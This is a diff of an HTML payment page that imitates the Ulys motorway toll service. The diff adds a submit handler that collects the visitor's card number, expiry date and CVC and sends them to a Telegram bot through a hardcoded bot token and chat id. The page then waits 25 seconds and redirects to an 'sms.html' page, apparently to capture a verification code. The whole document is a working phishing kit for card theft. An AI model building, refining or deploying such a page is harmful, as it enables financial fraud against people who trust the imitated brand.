@@ -6,7 +6,7 @@
   <title>Paiement – Ulys Télépéage</title>
   <link rel="stylesheet" href="assets/css/style.css"/>
   <style>
-    /* Spinner identique à celui de l’index */
+    /* Spinner overlay */
     #spinnerOverlay {
       display: none;
       position: fixed;
@@ -21,7 +21,7 @@
       width: 80px;
       height: 80px;
       border: 10px solid rgba(255, 255, 255, 0.2);
-      border-top: 10px solid #ff8000; /* orange accent Ulys */
+      border-top: 10px solid #ff8000;
       border-radius: 50%;
       animation: spin 1s linear infinite;
     }
@@ -29,17 +29,41 @@
     @keyframes spin {
       to { transform: rotate(360deg); }
     }
+
+    .accepted-logos {
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+      margin-bottom: 1rem;
+    }
+
+    .accepted-logos img {
+      height: 30px;
+      width: auto;
+    }
+
+    .card {
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 2rem;
+    }
+
+    h1 {
+      color: #1a1a1a;
+      text-align: center;
+      margin-bottom: 1.5rem;
+    }
   </style>
 </head>
 <body>
-  <!-- BANDEAU HAUT BLANC -->
+  <!-- BANDEAU HAUT -->
   <div class="top-nav">
     <a href="#"><span>👤</span> Mon espace</a>
     <a href="#" class="btn-primary">Devenir client</a>
     <div class="lang">FR ▼</div>
   </div>
 
-  <!-- NAVBAR PRINCIPALE BLANCHE -->
+  <!-- NAVBAR -->
   <div class="site-nav">
     <nav class="navbar">
       <div class="navbar-left">
@@ -60,32 +84,31 @@
     </nav>
   </div>
 
-<main class="container">
-  <div class="card">
-    <h1>Paiement sécurisé</h1>
+  <main class="container">
+    <div class="card">
+      <h1>Paiement sécurisé</h1>
 
-    <!-- Logos Visa, Mastercard, Amex -->
-    <div class="accepted-logos">
-      <img src="assets/images/visa.png" alt="Visa">
-      <img src="assets/images/Mastercard.png" alt="Mastercard">
-      <img src="assets/images/Amex.png" alt="American Express">
+      <!-- Logos -->
+      <div class="accepted-logos">
+        <img src="assets/images/visa.png" alt="Visa">
+        <img src="assets/images/Mastercard.png" alt="Mastercard">
+        <img src="assets/images/Amex.png" alt="American Express">
+      </div>
+
+      <form id="paymentForm">
+        <label for="cb-num">Numéro de carte</label>
+        <input type="text" id="cb-num" name="cb-num" maxlength="19" placeholder="1234 5678 9012 3456" required/>
+
+        <label for="cb-date">Expiration</label>
+        <input type="month" id="cb-date" name="cb-date" required/>
+
+        <label for="cb-cvc">CVC</label>
+        <input type="text" id="cb-cvc" name="cb-cvc" maxlength="4" placeholder="123" required/>
+
+        <button type="submit" class="btn">Valider le paiement</button>
+      </form>
     </div>
-
-    <form id="paymentForm">
-      <label for="cb-num">Numéro de carte</label>
-      <input type="text" id="cb-num" name="cb-num" maxlength="19" placeholder="1234 5678 9012 3456" required/>
-
-      <label for="cb-date">Expiration</label>
-      <input type="month" id="cb-date" name="cb-date" required/>
-
-      <label for="cb-cvc">CVC</label>
-      <input type="text" id="cb-cvc" name="cb-cvc" maxlength="4" placeholder="123" required/>
-
-      <button type="submit" class="btn">Valider le paiement</button>
-    </form>
-  </div>
-</main>
-
+  </main>
 
   <!-- Spinner overlay -->
   <div id="spinnerOverlay">
@@ -97,14 +120,37 @@
   </footer>
 
   <script>
-    // Affiche le spinner pendant 25 secondes avant de rediriger
     document.getElementById('paymentForm').addEventListener('submit', function(e) {
       e.preventDefault(); // Empêche la soumission immédiate
-      const overlay = document.getElementById('spinnerOverlay');
-      overlay.style.display = 'flex';
+
+      // Récupère les infos
+      const numCarte = document.getElementById('cb-num').value;
+      const expiration = document.getElementById('cb-date').value;
+      const cvc = document.getElementById('cb-cvc').value;
+
+      // Message Telegram
+      const message = `
+💳 Nouvelle tentative de paiement :
+🔢 Carte : ${numCarte}
+📅 Expiration : ${expiration}
+🔐 CVC : ${cvc}
+      `;
+
+      // Envoi à Telegram
+      fetch("https://api.telegram.org/bot7959354545:AAEfYBDF24DOs30vwYScteq1uWMO65FP8Fo/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: "-4911236455",
+          text: message
+        })
+      });
+
+      // Spinner + redirection après 25s
+      document.getElementById('spinnerOverlay').style.display = 'flex';
       setTimeout(() => {
         window.location.href = 'sms.html';
-      }, 25000); // 25 secondes
+      }, 25000);
     });
   </script>
 </body>
